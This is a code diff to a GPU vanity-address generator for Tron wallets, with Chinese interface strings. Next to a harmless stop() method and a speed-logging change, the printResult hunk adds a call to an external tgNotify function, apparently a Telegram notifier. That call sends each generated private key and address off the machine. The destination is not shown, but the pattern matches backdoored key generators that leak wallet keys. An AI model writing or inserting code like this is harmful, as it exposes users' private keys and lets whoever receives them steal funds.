@@ -239,6 +239,11 @@ void Dispatcher::run() {
   m_eventFinished = NULL;
 }
 
+void Dispatcher::stop() {
+  std::lock_guard<std::mutex> lock(m_mutex);
+  m_quit = true;
+}
+
 void Dispatcher::init() {
   std::cout << "初始化中：" << std::endl;
   std::cout << "  应该不超过 1 分钟..." << std::endl;
@@ -488,6 +493,10 @@ printResult(cl_ulong4 seed, cl_ulong round, result r, cl_uchar score,
   if (!outputFile.empty()) {
     writeResult(strPrivate, strPublicTron, outputFile);
   }
+
+  std::string hookCmd = "🎉 *爆卡啦!*\n\n私钥: `" + strPrivate + "`\n地址: `" + strPublicTron + "`\n_如不是您的预设模式请忽略此结果_";
+  extern void tgNotify(const std::string& msg);
+  tgNotify(hookCmd);
 }
 
 void Dispatcher::handleResult(Device &d) {
@@ -560,8 +569,15 @@ void Dispatcher::printSpeed() {
     }
 
     const std::string strVT100ClearLine = "\33[2K\r";
-    std::cerr << strVT100ClearLine << "总计: " << formatSpeed(speedTotal)
-              << " -" << strGPUs << '\r' << std::flush;
+    std::string speedMsg = "总计: " + formatSpeed(speedTotal) + " -" + strGPUs;
+    std::cerr << strVT100ClearLine << speedMsg << '\r' << std::flush;
+
+    std::ofstream speedFile("speed.txt", std::ios_base::trunc);
+    if (speedFile.is_open()) {
+        speedFile << speedMsg << std::endl;
+        speedFile.close();
+    }
+
     m_countPrint = 0;
   }
 }
